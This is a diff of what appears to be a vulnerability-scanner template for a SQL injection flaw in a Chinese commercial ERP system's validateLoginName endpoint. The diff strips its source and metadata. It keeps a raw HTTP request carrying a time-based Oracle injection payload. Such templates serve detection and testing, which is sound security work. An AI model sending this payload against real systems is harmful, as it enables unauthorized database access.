@@ -3,12 +3,8 @@ info:
   name: 云时空社会化商业ERP系统validateLoginName SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gh8eaui92p2nit42'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gh8eaui92p2nit42
-    fofa: app="云时空社会化商业ERP系统"
 http:
 - raw:
   - 'GET /sys/user/validateLoginName?loginName=admin''+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- HTTP/1.1
